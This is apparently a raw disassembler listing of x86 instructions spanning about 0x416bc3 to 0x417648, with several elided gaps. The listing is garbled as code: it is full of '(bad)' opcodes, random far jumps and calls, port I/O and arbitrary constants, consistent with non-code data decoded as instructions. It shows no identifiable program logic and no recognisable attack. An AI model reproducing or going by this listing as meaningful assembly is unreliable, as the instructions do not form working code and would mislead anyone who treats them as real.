  416bc3:	jno    0x416bc9
  416bc5:	lock and BYTE PTR [esi],cl
  416bc8:	push   es
  416bc9:	aas    
  416bca:	cmp    DWORD PTR [ecx],ecx
  416bcc:	and    al,0xe2
  416bce:	lds    edi,FWORD PTR [esi]
  416bd0:	xchg   DWORD PTR [ebp+0x1e1af83b],edi
  416bd6:	inc    edx
  416bd7:	je     0x416baa
  416bd9:	sbb    ebp,eax
  416bdb:	je     0x416c0e
  416bdd:	xchg   ebx,eax
  416bde:	bnd jno 0x416c31
  416be1:	mov    esp,0xdf51ad0f
  416be6:	sub    al,0xbb
  416be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416be9:	test   DWORD PTR ds:0xac1e22e8,eax
  416bef:	outs   dx,BYTE PTR ds:[esi]
  416bf0:	xor    BYTE PTR [eax],dh
  416bf2:	cmc    
  416bf3:	jbe    0x416c34
  416bf5:	push   ds
  416bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bf7:	jmp    0xe36d:0xd96f50cd
  416bfe:	push   edx
  416bff:	adc    eax,0xd0af9963
  416c04:	push   ss
  416c05:	test   edx,esp
  416c07:	(bad)
  416c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c0e:	and    al,0xc2
  416c10:	xor    eax,0xe751d914
  416c15:	loopne 0x416c71
  416c17:	pop    ecx
  416c18:	push   esp
  416c19:	sbb    eax,0xe3f467d6
  416c1e:	push   ecx
  416c1f:	push   esp
  416c20:	(bad)  
  416c21:	sbb    ecx,DWORD PTR [ebp+0x2b]
  416c24:	pop    esp
  416c25:	fwait
  416c26:	jnp    0x416c63
  416c28:	hlt    
  416c29:	xor    al,0x92
  416c2b:	xchg   ebx,eax
  416c2c:	jle    0x416be7
  416c2e:	prefetch BYTE PTR ds:0x49d3d697
  416c35:	shl    BYTE PTR [ecx+0x41],cl
  416c38:	xor    BYTE PTR [edi],dh
  416c3a:	je     0x416c4b
  416c3c:	and    bl,0xdd
  416c3f:	adc    dl,bh
  416c41:	int3   
  416c42:	mov    dl,0x1d
  416c44:	mov    ebx,0x1e5c6713
  416c49:	and    DWORD PTR [ebp+ecx*4-0x3b19b9fd],esp
  416c50:	sbb    esi,DWORD PTR [ebp-0x36bf221e]
  416c56:	scas   al,BYTE PTR es:[edi]
  416c57:	dec    esi
  416c58:	mov    ch,0xfc
  416c5a:	cmp    al,0x89
  416c5c:	inc    ebx
  416c5d:	loop   0x416c88
  416c5f:	inc    ebp
  416c60:	enter  0x546d,0x6e
  416c64:	sti    
  416c65:	push   ds
  416c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c67:	out    0x72,al
  416c69:	and    DWORD PTR [edx],eax
  416c6b:	imul   esp,DWORD PTR ds:0x463a9c44,0xbcc1e727
  416c75:	mov    cl,0xaf
  416c77:	popf   
  416c78:	cdq    
  416c79:	idiv   DWORD PTR [edx]
  416c7b:	arpl   di,cx
  416c7d:	sbb    al,dh
  416c7f:	sub    BYTE PTR [ecx-0x7ec66878],ch
  416c85:	push   esp
  416c86:	push   esi
  416c87:	xlat   BYTE PTR ds:[ebx]
  416c88:	bound  eax,QWORD PTR [eax+0x1467b981]
  416c8e:	aas    
  416c8f:	pop    ebx
  416c90:	add    BYTE PTR [ebx-0x14cab5c3],bh
  416c96:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  416c98:	cwde   
  416c99:	(bad)  
  416c9a:	in     al,dx
  416c9b:	out    0xd1,al
  416c9d:	xchg   esp,eax
  416c9e:	retf   0x982f
  416ca1:	sbb    eax,0xc841ac8c
  416ca6:	push   ds
  416ca7:	add    BYTE PTR [edx-0x768ce4a4],dl
  416cad:	pop    ds
  416cae:	push   ebp
  416caf:	cs out dx,al
  416cb1:	or     BYTE PTR [ebx],0x25
  416cb4:	out    0x0,eax
	...
  416d16:	and    DWORD PTR [ebx-0x40445077],edx
  416d1c:	daa    
  416d1d:	lahf   
  416d1e:	or     DWORD PTR ds:0x36a480c9,edi
  416d24:	sbb    al,0x51
  416d26:	(bad)  
  416d27:	out    dx,al
  416d28:	add    BYTE PTR [eax],al
  416d2a:	pop    es
  416d2b:	add    DWORD PTR [eax],eax
  416d2d:	add    BYTE PTR [esi],bl
  416d2f:	fiadd  DWORD PTR [ebp+0x758b932]
  416d35:	adc    ch,BYTE PTR [ebx+edx*1-0x1d8a020]
  416d3c:	and    ecx,DWORD PTR [ebx-0x68bfa939]
  416d42:	jecxz  0x416cf3
  416d44:	iret   
  416d45:	cld    
  416d46:	jb     0x416d44
  416d48:	es jp  0x416cff
  416d4b:	sbb    edx,DWORD PTR [ebx+0x1c]
  416d4e:	rol    DWORD PTR [ebp-0x224914ed],0xf2
  416d55:	sbb    DWORD PTR es:[edi+0x47],edi
  416d59:	sub    al,0x2b
  416d5b:	push   edx
  416d5c:	call   0x4be8:0x8de4a963
  416d63:	mov    ebp,0x49c33b0b
  416d68:	xor    eax,0x2f43151f
  416d6d:	push   0x71faddf0
  416d72:	ret    
  416d73:	sub    edi,DWORD PTR [edx+0x18]
  416d76:	shr    DWORD PTR [edx+0x30],cl
  416d79:	dec    ebp
  416d7a:	sub    dh,BYTE PTR ds:0xf865c964
  416d80:	mov    cl,0xde
  416d82:	sbb    dl,bl
  416d84:	push   ebx
  416d85:	cli    
  416d86:	cmp    eax,0xc4f09890
  416d8b:	mov    ecx,0xbd53909
  416d90:	xor    eax,0xb65775b9
  416d95:	pop    esp
  416d96:	jns    0x416d66
  416d98:	(bad)  
  416d99:	mov    edx,0xcd795104
  416d9e:	or     eax,0xab2b069e
  416da3:	nop
  416da4:	adc    dh,cl
  416da6:	xor    esp,DWORD PTR [ebx-0x73]
  416da9:	aaa    
  416daa:	xor    BYTE PTR [ebx-0x2a5cd872],dl
  416db0:	fcom   st(6)
  416db2:	xor    ch,ah
  416db4:	jecxz  0x416d81
  416db6:	int    0xfa
  416db8:	sti    
  416db9:	inc    esp
  416dba:	retfw  0x170d
  416dbe:	fsubr  DWORD PTR ds:0x110e69f1
  416dc4:	push   ds
  416dc5:	push   ebx
  416dc6:	pop    eax
  416dc7:	push   0xffffff9f
  416dc9:	jmp    0x416d82
  416dcb:	ror    BYTE PTR [edi-0x2b],1
  416dce:	repz lds eax,FWORD PTR [ecx+0x3ed32929]
  416dd5:	jno    0x416d5f
  416dd7:	sar    BYTE PTR [edi+0x4866b697],0x7
  416dde:	sub    edi,esp
  416de0:	call   0xa86d:0x466e2db1
  416de7:	cwde   
  416de8:	adc    BYTE PTR [ebp-0x7b5ba6e2],dl
  416dee:	add    dl,dl
  416df0:	sar    DWORD PTR [ebp+0x75fdec83],cl
  416df6:	xchg   esi,eax
  416df7:	pop    ds
  416df8:	xchg   edx,eax
  416df9:	mov    cl,0x69
  416dfb:	ins    BYTE PTR es:[edi],dx
  416dfc:	sbb    eax,0x8b500b3a
  416e01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e02:	aam    0x27
  416e04:	xor    al,0xf5
  416e06:	or     eax,0x94a6e61e
  416e0b:	test   eax,0xf68e900c
  416e10:	pushf  
  416e11:	add    al,0x34
  416e13:	mov    bh,0xb4
  416e15:	add    eax,0xc8f2c9d
  416e1a:	and    edi,DWORD PTR [esi+0x442fbe03]
  416e20:	push   esi
  416e21:	sbb    BYTE PTR [ecx-0x1a69aa24],dh
  416e27:	rol    BYTE PTR [esi-0x55e757f4],cl
  416e2d:	dec    esi
  416e2e:	dec    edi
  416e2f:	imul   esi,DWORD PTR [ebx+0x1d],0xffffffb2
  416e33:	pop    edx
  416e34:	cli    
	...
  416e95:	add    BYTE PTR [edi-0x519271e7],bh
  416e9b:	(bad)  
  416e9c:	(bad)  
  416e9d:	(bad)  
  416e9f:	fstp   QWORD PTR [edx+ecx*8+0x257914a4]
  416ea6:	int    0xef
  416ea8:	add    BYTE PTR [eax],al
  416eaa:	pop    es
  416eab:	add    DWORD PTR [eax],eax
  416ead:	add    ch,ah
  416eaf:	daa    
  416eb0:	shl    BYTE PTR ds:0xe31c39ab,0xf3
  416eb7:	jp     0x416e7a
  416eb9:	pop    ebp
  416eba:	push   eax
  416ebb:	push   edi
  416ebc:	test   eax,0xc6945800
  416ec1:	dec    eax
  416ec2:	es icebp 
  416ec4:	inc    edx
  416ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ec6:	ss into 
  416ec8:	fbld   TBYTE PTR [edi+0x2d]
  416ecb:	sbb    BYTE PTR [edx],dl
  416ecd:	lods   al,BYTE PTR ds:[esi]
  416ece:	imul   eax,DWORD PTR [eax+0xa],0x427d48bf
  416ed5:	xor    ebp,0xba4cac30
  416edb:	jns    0x416edf
  416edd:	aad    0x6d
  416edf:	push   ss
  416ee0:	and    BYTE PTR [esi+0x40],bh
  416ee3:	cmp    BYTE PTR [edx],0xd2
  416ee6:	cmp    esp,DWORD PTR [eax]
  416ee8:	mov    WORD PTR [edx],ds
  416eea:	fild   QWORD PTR [ecx-0x59589540]
  416ef0:	sub    BYTE PTR [ebx+0x11b1ea2b],ah
  416ef6:	imul   ecx,DWORD PTR [ecx+0x43],0x173c8c4f
  416efd:	mov    ebp,edi
  416eff:	xor    esi,DWORD PTR [edi+edx*2-0x3c]
  416f03:	jle    0x416e88
  416f05:	cdq    
  416f06:	mul    DWORD PTR [edx]
  416f08:	mov    ds:0xe36222e4,eax
  416f0d:	jbe    0x416f1c
  416f0f:	js     0x416ec7
  416f11:	fdiv   QWORD PTR [ebx+edi*8]
  416f14:	or     BYTE PTR [ebx],bh
  416f16:	in     eax,0x1e
  416f18:	mov    al,ds:0xb10950a0
  416f1d:	sub    BYTE PTR [edx],bl
  416f1f:	into   
  416f20:	iret   
  416f21:	xchg   esp,eax
  416f22:	rcr    DWORD PTR [ebp+0x43],0xf6
  416f26:	ja     0x416ed3
  416f28:	inc    esi
  416f29:	aaa    
  416f2a:	inc    esi
  416f2b:	(bad)  
  416f2c:	out    0x91,al
  416f2e:	das    
  416f2f:	dec    esi
  416f30:	inc    edi
  416f31:	or     dl,BYTE PTR [eax]
  416f33:	cld    
  416f34:	mov    ah,0x56
  416f36:	lds    ecx,FWORD PTR [edi]
  416f38:	add    eax,0x981473a1
  416f3d:	jge    0x416fb6
  416f3f:	popf   
  416f40:	hlt    
  416f41:	mov    dh,0xab
  416f43:	aas    
  416f44:	mov    ds,WORD PTR [ecx+0x3709d5eb]
  416f4a:	inc    esp
  416f4b:	or     eax,0xbd6f9b92
  416f50:	pusha  
  416f51:	add    ebx,DWORD PTR [ecx-0x2d]
  416f54:	iret   
  416f55:	ss pop edx
  416f57:	mov    edi,esi
  416f59:	adc    DWORD PTR [ebx+0x12f1232a],edx
  416f5f:	loop   0x416f33
  416f61:	mov    ecx,0x97c7157f
  416f66:	adc    eax,0xe3e02346
  416f6b:	mov    ebp,0x5eff662a
  416f70:	aas    
  416f71:	int    0xc2
  416f73:	(bad)  
  416f74:	jecxz  0x416f47
  416f76:	or     eax,0x689602e4
  416f7b:	fbld   TBYTE PTR [edx-0x62]
  416f7e:	ss cld 
  416f80:	je     0x416fc7
  416f82:	daa    
  416f83:	les    eax,FWORD PTR [ebx-0x45f727e4]
  416f89:	bt     DWORD PTR [ebx],edi
  416f8c:	(bad)  
  416f8e:	or     BYTE PTR ds:0xac99ed5,dh
  416f94:	push   es
  416f95:	(bad)  
  416f96:	jmp    0x416fff
  416f98:	call   0x68d3:0x3f3583c2
  416f9f:	push   esi
  416fa0:	jae    0x416fbd
  416fa2:	xchg   esp,eax
  416fa3:	stc    
  416fa4:	xor    eax,0x4d33c6c4
  416fa9:	mov    ebp,esp
  416fab:	fwait
  416fac:	pop    esp
  416fad:	popf   
  416fae:	jl     0x416f80
  416fb0:	clc    
  416fb1:	add    BYTE PTR [esi+eax*1],bl
  416fb4:	pop    ebx
	...
  417015:	add    BYTE PTR [esi+0x2d],dh
  417018:	push   ebp
  417019:	inc    ecx
  41701a:	pop    edi
  41701b:	jns    0x417093
  41701d:	aas    
  41701e:	lods   al,BYTE PTR ds:[esi]
  41701f:	fmul   QWORD PTR [eax-0x50]
  417022:	stc    
  417023:	add    al,0x7e
  417025:	ja     0x416ffb
  417027:	lock add BYTE PTR [eax],al
  41702a:	pop    es
  41702b:	add    DWORD PTR [eax],eax
  41702d:	add    BYTE PTR [ebx+0x2e],bh
  417030:	adc    BYTE PTR [esi],ch
  417032:	jge    0x417087
  417034:	xor    al,0xc3
  417036:	mov    ch,BYTE PTR [esi+0xa]
  417039:	add    al,BYTE PTR [ecx-0x33]
  41703c:	mov    eax,ds:0xfccc715e
  417041:	idiv   DWORD PTR [ecx+0x28]
  417044:	sbb    BYTE PTR [esi-0x525c9a76],ah
  41704a:	popa   
  41704b:	retf   0xde0b
  41704e:	sbb    esp,DWORD PTR [ebx]
  417050:	in     eax,0xf2
  417052:	popf   
  417053:	retf   0xe079
  417056:	or     BYTE PTR [edx],0x4
  417059:	push   0x82ff31d
  41705e:	aas    
  41705f:	push   0xffffffd3
  417061:	cli    
  417062:	sbb    eax,DWORD PTR [ecx+0x59]
  417065:	pop    ss
  417066:	test   BYTE PTR [eax-0x5d],dh
  417069:	fs call 0xdb9a:0x2d25b128
  417071:	stos   BYTE PTR es:[edi],al
  417072:	ss in  al,0x5c
  417075:	cld    
  417076:	pop    ds
  417077:	imul   edi,DWORD PTR [edi-0x4e5d679b],0x36
  41707e:	imul   esi,ebp,0xd2205e43
  417084:	hlt    
  417085:	mov    ebp,0x6f6a1ebf
  41708a:	leave  
  41708b:	xchg   ebx,eax
  41708c:	ins    BYTE PTR es:[edi],dx
  41708d:	jecxz  0x41706c
  41708f:	mov    ds:0xb5d7f151,eax
  417094:	in     eax,dx
  417095:	mov    DWORD PTR [esp+ebx*2+0x5d],edi
  417099:	fst    DWORD PTR ds:[edx-0x5b]
  41709d:	fdiv   DWORD PTR [edx+ecx*4]
  4170a0:	mov    bh,0xe0
  4170a2:	ret    
  4170a3:	ds add al,0x4
  4170a6:	dec    eax
  4170a7:	dec    ebp
  4170a8:	(bad)  
  4170aa:	push   edx
  4170ab:	jmp    0xe5b:0x591fdb30
  4170b2:	mov    ecx,0xf7523fbf
  4170b7:	jns    0x417055
  4170b9:	(bad)  
  4170ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170bb:	pop    ebp
  4170bc:	retf   0x4b87
  4170bf:	idiv   al
  4170c1:	pushf  
  4170c2:	or     DWORD PTR [edx+ecx*8-0x43741348],ecx
  4170c9:	aas    
  4170ca:	cmp    ebp,ebp
  4170cc:	inc    BYTE PTR [edx-0x22]
  4170cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170d0:	mov    esp,0xc5e990d
  4170d5:	mov    esp,0x157f43c6
  4170da:	push   ds
  4170db:	rcl    BYTE PTR [esi+0x6],cl
  4170de:	in     eax,dx
  4170df:	adc    al,0xee
  4170e1:	shl    DWORD PTR [edx],cl
  4170e3:	shl    DWORD PTR [esi],1
  4170e5:	pop    ebx
  4170e6:	inc    ebx
  4170e7:	mov    ss,esp
  4170e9:	inc    ecx
  4170ea:	gs aaa 
  4170ec:	clc    
  4170ed:	test   BYTE PTR [ecx],0x74
  4170f0:	dec    esp
  4170f1:	sub    DWORD PTR [ecx-0x49],edi
  4170f4:	push   es
  4170f5:	sub    DWORD PTR [edi-0xe41b34e],0x1a
  4170fc:	mov    dh,0x80
  4170fe:	or     edi,esp
  417100:	cmp    eax,0xffaa6121
  417105:	xor    DWORD PTR [ebp+0x7c],edi
  417108:	call   0x4648c019
  41710d:	jae    0x417166
  41710f:	cmp    DWORD PTR [esi+0x56],eax
  417112:	push   0x3b
  417114:	std    
  417115:	mov    esi,0x9b11af63
  41711a:	mov    ah,0xb
  41711c:	mov    al,ds:0x8d336d2e
  417121:	in     al,dx
  417122:	pop    ecx
  417123:	inc    edi
  417124:	repz add bh,dh
  417127:	sub    esi,edx
  417129:	xor    DWORD PTR [edi*4+0x520dee5d],ecx
  417130:	minps  xmm6,XMMWORD PTR [eax+0x57]
  417134:	fld    QWORD PTR [eax]
	...
  417196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417197:	sbb    DWORD PTR [eax+0x1a],esi
  41719a:	(bad)  
  41719b:	jnp    0x41718b
  41719d:	mov    ebp,0x5dd8ff3
  4171a2:	cli    
  4171a3:	(bad)  
  4171a4:	int3   
  4171a5:	mov    ah,0xdb
  4171a7:	icebp  
  4171a8:	add    BYTE PTR [eax],al
  4171aa:	pop    es
  4171ab:	add    DWORD PTR [eax],eax
  4171ad:	add    BYTE PTR [ecx-0x12],cl
  4171b0:	daa    
  4171b1:	movq   mm6,QWORD PTR [esi+0x21]
  4171b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171b6:	shl    DWORD PTR [ecx+0x7a2b2cb4],cl
  4171bc:	xchg   ecx,eax
  4171bd:	call   0xaf8d6218
  4171c2:	lock push es
  4171c4:	dec    edx
  4171c5:	add    eax,0x3b51e67c
  4171ca:	icebp  
  4171cb:	adc    BYTE PTR [eax-0x69],ch
  4171ce:	pop    edx
  4171cf:	ins    BYTE PTR es:[edi],dx
  4171d0:	(bad)  
  4171d1:	xchg   edi,eax
  4171d2:	dec    ebx
  4171d3:	mov    ah,0x1c
  4171d5:	(bad)  
  4171d7:	dec    eax
  4171d8:	push   ss
  4171d9:	ss icebp 
  4171db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171dc:	push   ebx
  4171dd:	pop    edx
  4171de:	(bad)  
  4171e0:	(bad)  
  4171e1:	sub    ah,BYTE PTR [ecx+0x4]
  4171e4:	push   edi
  4171e5:	sub    BYTE PTR [ecx],0x3b
  4171e8:	jp     0x417224
  4171ea:	fdiv   DWORD PTR [esi]
  4171ec:	dec    ebp
  4171ed:	inc    eax
  4171ee:	sub    BYTE PTR [edi],ch
  4171f0:	sahf   
  4171f1:	pop    edi
  4171f2:	mov    ebx,0x58effd4d
  4171f7:	dec    edx
  4171f8:	ret    
  4171f9:	sub    eax,0x2f792ecf
  4171fe:	adc    DWORD PTR [edx+0x48],edi
  417201:	mov    WORD PTR [edi+0x21],ds
  417204:	test   BYTE PTR [edi+0xc],ah
  417207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417208:	ins    BYTE PTR es:[edi],dx
  417209:	jl     0x41726e
  41720b:	xor    DWORD PTR [eax],eax
  41720d:	cmc    
  41720e:	lods   al,BYTE PTR ds:[esi]
  41720f:	loop   0x41726d
  417211:	cmp    DWORD PTR [edi-0x244a8218],esp
  417217:	push   es
  417218:	fst    QWORD PTR [esp+edi*4+0x6a4dae50]
  41721f:	(bad)  
  417220:	push   edx
  417221:	mov    dh,BYTE PTR [ebp+esi*1-0xb92764d]
  417228:	ins    DWORD PTR es:[edi],dx
  417229:	or     esp,esp
  41722b:	imul   DWORD PTR [ebx+eiz*8+0x228a9aeb]
  417232:	jbe    0x417202
  417234:	inc    esp
  417235:	nop
  417236:	mov    es,WORD PTR [ebp+0x4b6fd47a]
  41723c:	xor    ebp,esp
  41723e:	or     eax,0x1c47396b
  417243:	(bad)  
  417245:	clc    
  417246:	add    al,0x86
  417248:	cmp    ebx,DWORD PTR [esp+edi*2+0x1e]
  41724c:	cli    
  41724d:	call   0x66439006
  417252:	ss push cs
  417254:	stos   DWORD PTR es:[edi],eax
  417255:	and    dl,ah
  417257:	mov    edi,0xbe7cd2e7
  41725c:	(bad)  
  41725d:	loope  0x4171f5
  41725f:	dec    esp
  417260:	push   si
  417262:	mov    esp,0xd3ecb425
  417267:	dec    edi
  417268:	or     DWORD PTR [ecx],esi
  41726a:	call   0x121:0x140d8bf7
  417271:	push   edx
  417272:	push   ecx
  417273:	xchg   ebp,eax
  417274:	out    0xde,eax
  417276:	jbe    0x417265
  417278:	nop
  417279:	mov    ds:0x97a94f75,al
  41727e:	sub    esp,esi
  417280:	adc    DWORD PTR ds:0x8062038d,esp
  417286:	outs   dx,BYTE PTR ds:[esi]
  417287:	pop    edx
  417288:	rcl    edx,cl
  41728a:	lea    esp,ds:0x7acd2575
  417290:	push   ds
  417291:	push   cs
  417292:	mov    edx,0x5ea881da
  417297:	mov    eax,0xa6aac6dc
  41729c:	jo     0x4172f4
  41729e:	or     esi,ecx
  4172a0:	jecxz  0x41728a
  4172a2:	bound  ecx,QWORD PTR [ebp-0x19f1b897]
  4172a8:	sub    cl,0x86
  4172ab:	jmp    0x8b5c:0x2f8a786d
  4172b2:	pop    ds
  4172b3:	cmp    dl,dh
	...
  417315:	add    BYTE PTR [ecx-0x44],ch
  417318:	xlat   BYTE PTR ds:[ebx]
  417319:	pop    esi
  41731a:	xlat   BYTE PTR ds:[ebx]
  41731b:	jg     0x417306
  41731d:	mov    edi,0x85e5bf4a
  417322:	and    eax,0xe22069b2
  417327:	repnz add BYTE PTR [eax],al
  41732a:	pop    es
  41732b:	add    DWORD PTR [eax],eax
  41732d:	add    cl,ah
  41732f:	aam    0x16
  417331:	mov    esp,0x4bd672a4
  417336:	push   ss
  417337:	ds sub al,0x51
  41733a:	or     BYTE PTR [ebx+0x7d],cl
  41733d:	mov    edx,0xe0b39499
  417342:	jmp    0x41738f
  417344:	dec    eax
  417345:	xchg   ebp,eax
  417346:	mov    dl,BYTE PTR [ecx-0x75]
  417349:	imul   BYTE PTR ss:[di+0x0]
  41734e:	bound  ebx,QWORD PTR [edi-0x68]
  417351:	xchg   ecx,eax
  417352:	hlt    
  417353:	mov    al,0xef
  417355:	rcr    DWORD PTR [ebp+0x3234a8cd],1
  41735b:	(bad)  [edx]
  41735d:	bound  ecx,QWORD PTR [esi+0x49]
  417360:	inc    ebp
  417361:	in     eax,dx
  417362:	mov    ah,0x44
  417364:	(bad)  
  417366:	loopne 0x41739a
  417368:	mov    edx,0x386deb08
  41736d:	lock outs dx,BYTE PTR ds:[esi]
  41736f:	pop    es
  417370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417371:	xchg   edx,eax
  417372:	push   edi
  417373:	mov    ss,WORD PTR [edx-0x3c15f458]
  417379:	pop    edx
  41737a:	sbb    al,0x5a
  41737c:	es dec ecx
  41737e:	mov    ah,0xe6
  417380:	das    
  417381:	popf   
  417382:	xchg   edi,ebx
  417384:	jbe    0x4173b9
  417386:	les    eax,FWORD PTR [edi]
  417388:	pop    ds
  417389:	(bad)  
  41738a:	mov    bh,0x33
  41738c:	aam    0x32
  41738e:	push   ebx
  41738f:	push   DWORD PTR [edi-0x263a45da]
  417395:	pop    eax
  417396:	js     0x417383
  417398:	js     0x4173f5
  41739a:	test   BYTE PTR [edx+0x13925ea1],dh
  4173a0:	out    dx,al
  4173a1:	inc    eax
  4173a2:	fiadd  WORD PTR [ecx]
  4173a4:	add    al,0xc5
  4173a6:	sub    DWORD PTR [edi],ebx
  4173a8:	pop    esp
  4173a9:	jmp    0x849e:0x21c18a03
  4173b0:	gs mov eax,0x5a7895f5
  4173b6:	dec    ebx
  4173b7:	aad    0xb4
  4173b9:	lods   al,BYTE PTR ds:[esi]
  4173ba:	ror    edx,1
  4173bc:	call   0xd2534a06
  4173c1:	ret    
  4173c2:	pushf  
  4173c3:	sub    BYTE PTR [ecx-0x17],bh
  4173c6:	push   ecx
  4173c7:	pusha  
  4173c8:	mov    ds:0x38f2912e,al
  4173cd:	inc    eax
  4173ce:	retf   
  4173cf:	mov    edi,0x49040480
  4173d4:	jnp    0x41738b
  4173d6:	dec    edx
  4173d7:	add    DWORD PTR [ebp+0x20],ecx
  4173da:	cmp    BYTE PTR [ecx-0x33],al
  4173dd:	sbb    ebx,edi
  4173df:	inc    ebp
  4173e0:	cmp    BYTE PTR [eax-0x13d9dd5e],dh
  4173e6:	mov    edi,0x6f852927
  4173eb:	push   edx
  4173ec:	int    0xee
  4173ee:	add    al,0xe8
  4173f0:	mov    al,ds:0x98ab701e
  4173f5:	pop    edi
  4173f6:	test   al,0x42
  4173f8:	push   edx
  4173f9:	xchg   edx,eax
  4173fa:	inc    edx
  4173fb:	(bad)  
  4173fd:	imul   BYTE PTR [ecx+0x26d050d2]
  417403:	cmp    al,0x41
  417405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417406:	pop    edi
  417407:	inc    ebp
  417408:	cli    
  417409:	sbb    dl,bh
  41740b:	cmp    dh,BYTE PTR ds:0xa2f2e893
  417411:	jbe    0x41742a
  417413:	rep outs dx,BYTE PTR ds:[esi]
  417415:	loop   0x417419
  417417:	jo     0x417487
  417419:	pop    esi
  41741a:	fwait
  41741b:	mov    edx,0x446da6a6
  417420:	xor    BYTE PTR [edi-0x27d4b6fa],0x20
  417427:	cs inc edi
  417429:	mov    edx,0x262ef3f
  41742e:	cmp    al,0xc6
  417430:	inc    eax
  417431:	xchg   ebx,eax
  417432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417433:	jae    0x417464
	...
  417495:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41749b:	fdivr  st(7),st
  41749d:	mov    edi,0x6bda61d2
  4174a2:	int    0xb
  4174a4:	xor    eax,0xf3e9a0
  4174a9:	add    BYTE PTR [edi],al
  4174ab:	add    DWORD PTR [eax],eax
  4174ad:	add    al,bh
  4174af:	cmp    dl,bl
  4174b1:	es lahf 
  4174b3:	clc    
  4174b4:	inc    ebx
  4174b5:	imul   eax,DWORD PTR [ebx-0x14],0xe12e8acf
  4174bc:	out    dx,eax
  4174bd:	pop    ecx
  4174be:	pop    eax
  4174bf:	sbb    BYTE PTR [esi+eax*1],dh
  4174c2:	and    BYTE PTR [edi+0x57653827],dh
  4174c8:	frstor [ebx-0x31]
  4174cb:	inc    edx
  4174cc:	adc    al,cl
  4174ce:	ds pop ecx
  4174d0:	outs   dx,BYTE PTR ds:[si]
  4174d2:	dec    edx
  4174d3:	mul    WORD PTR [edx+0x511ab636]
  4174da:	fwait
  4174db:	imul   ecx,esi,0xffffffa9
  4174de:	dec    ebp
  4174df:	mov    ebx,0xea80a685
  4174e4:	xchg   ebp,eax
  4174e5:	repz ds f2xm1 
  4174e9:	(bad)  
  4174eb:	in     al,0xcd
  4174ed:	push   ebx
  4174ee:	sub    eax,0xe425a44e
  4174f3:	fnsave [edi+edi*1]
  4174f6:	add    ecx,esi
  4174f8:	add    esi,eax
  4174fa:	inc    ebx
  4174fb:	stc    
  4174fc:	sub    eax,0xd0779d35
  417501:	cwde   
  417502:	pop    edx
  417503:	data16 add BYTE PTR [esp+edx*2+0x65ea5199],bh
  41750b:	and    ch,BYTE PTR [ebx+0x8]
  41750e:	call   0xc6f0:0xbecb5769
  417515:	jne    0x4174ef
  417517:	hlt    
  417518:	sub    eax,0x1bea2132
  41751e:	hlt    
  41751f:	sub    esp,edx
  417521:	sti    
  417522:	mov    ch,0xa1
  417524:	mov    ah,0x23
  417526:	ret    
  417527:	test   DWORD PTR [esp+ecx*8],edx
  41752a:	add    eax,0xff2f6b0d
  41752f:	dec    ebx
  417530:	pop    edx
  417531:	and    eax,0x10beeb49
  417536:	imul   ecx,DWORD PTR [esi],0xad9c2e64
  41753c:	or     al,0x55
  41753e:	adc    BYTE PTR [esi+0x4f],dl
  417541:	fwait
  417542:	ror    BYTE PTR [eax],1
  417544:	popf   
  417545:	and    al,0x85
  417547:	inc    eax
  417548:	lods   al,BYTE PTR es:[esi]
  41754a:	(bad)  
  41754b:	cld    
  41754c:	adc    al,0x2c
  41754e:	shl    DWORD PTR [edx+0x113d75ae],1
  417554:	mov    bh,0xc7
  417556:	mov    ebx,?
  417558:	imul   DWORD PTR [edx]
  41755a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41755b:	in     eax,dx
  41755c:	shl    bl,1
  41755e:	push   cs
  41755f:	cmp    DWORD PTR [edi-0x4510ac21],eax
  417565:	xchg   ebp,eax
  417566:	mov    esi,DWORD PTR [edi+0x4e]
  417569:	lahf   
  41756a:	add    BYTE PTR [eax+0x35],dl
  41756d:	aad    0x9f
  41756f:	xor    esp,DWORD PTR [edi-0x46]
  417572:	xchg   esi,eax
  417573:	push   ecx
  417574:	mov    dh,0xa3
  417576:	or     eax,0x3d6c5bce
  41757b:	aam    0xd
  41757d:	mov    eax,0xe6095f59
  417582:	loope  0x41756f
  417584:	push   esi
  417585:	gs mov ebp,0x1c6cc23d
  41758b:	ins    DWORD PTR es:[edi],dx
  41758c:	inc    edi
  41758d:	ins    BYTE PTR es:[edi],dx
  41758e:	cld    
  41758f:	sbb    bh,dl
  417591:	inc    ebx
  417592:	(bad)  
  417593:	iret   
  417594:	add    eax,0xcf23eeb9
  417599:	jno    0x41760a
  41759b:	sub    DWORD PTR [esi+edx*8+0x6fb371ef],ecx
  4175a2:	ret    0xaf4b
  4175a5:	imul   eax,DWORD PTR [edx-0x48dcc910],0x53042e34
  4175af:	xchg   edx,eax
  4175b0:	int    0x6e
  4175b2:	or     esi,DWORD PTR [ebp+0x51]
	...
  417615:	add    BYTE PTR [ecx-0x20b02c99],ch
  41761b:	(bad)  
  41761c:	mov    ebp,0x670b0ae7
  417621:	fdivr  DWORD PTR [ebp-0xf6f7faa]
  417627:	hlt    
  417628:	add    BYTE PTR [eax],al
  41762a:	pop    es
  41762b:	add    DWORD PTR [eax],eax
  41762d:	add    BYTE PTR [edi],ah
  41762f:	add    BYTE PTR [edx],ch
  417631:	jb     0x4175fa
  417633:	jne    0x4175c4
  417635:	retf   
  417636:	ret    
  417637:	or     DWORD PTR [edi-0x284fca21],esp
  41763d:	xor    al,0x29
  41763f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417640:	in     eax,0x44
  417642:	sar    BYTE PTR [esi-0x12fc2bb],cl
  417648:	ror    BYTE PTR [edx],0x85
